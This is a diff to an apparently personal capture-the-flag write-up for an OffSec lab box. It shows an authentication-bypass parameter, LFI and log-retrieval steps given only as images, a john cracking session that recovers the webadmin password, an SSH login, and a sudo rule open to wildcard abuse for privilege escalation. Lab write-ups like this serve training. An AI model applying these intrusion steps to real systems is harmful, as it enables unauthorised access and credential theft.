@@ -228,3 +228,42 @@ username=admin&password[]=%22%22
 ```
 ![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/ff103e6a-bbc1-461c-93af-52c3e31f8513)
 ![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/e027a1dd-7584-45d2-b48b-94fed9f7f518)
+![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/f0b7f66d-2cf2-477b-a577-257ed8875352)
+
+Retreiving Log Files
+![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/4bf22620-48c9-4690-bfd7-89e99271e332)
+
+LFI
+![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/1afd0ddd-5df6-47c3-a0a3-d6c198a9191d)
+
+Crack Hash
+```shell
+> john --wordlist=/usr/share/wordlists/rockyou.txt pass.txt
+Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
+Use the "--format=md5crypt-long" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+dragon           (webadmin)     
+1g 0:00:00:00 DONE (2023-10-18 05:31) 100.0g/s 19200p/s 19200c/s 19200C/s 123456..november
+Use the "--show" option to display all of the cracked passwords reliably
+```
+
+SSH as Webadmin
+```shell
+> ssh webadmin@192.168.224.101
+```
+![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/9789d52c-f27c-4dbc-a2e4-4ef89e8a98a0)
+
+Privilege Escalation
+```shell
+webadmin@serv:~$ sudo -l
+[sudo] password for webadmin: 
+Matching Defaults entries for webadmin on serv:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User webadmin may run the following commands on serv:
+    (ALL : ALL) /bin/nice /notes/*
+```
+![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/ea82f0b6-c920-4d99-a070-80de59f21561)
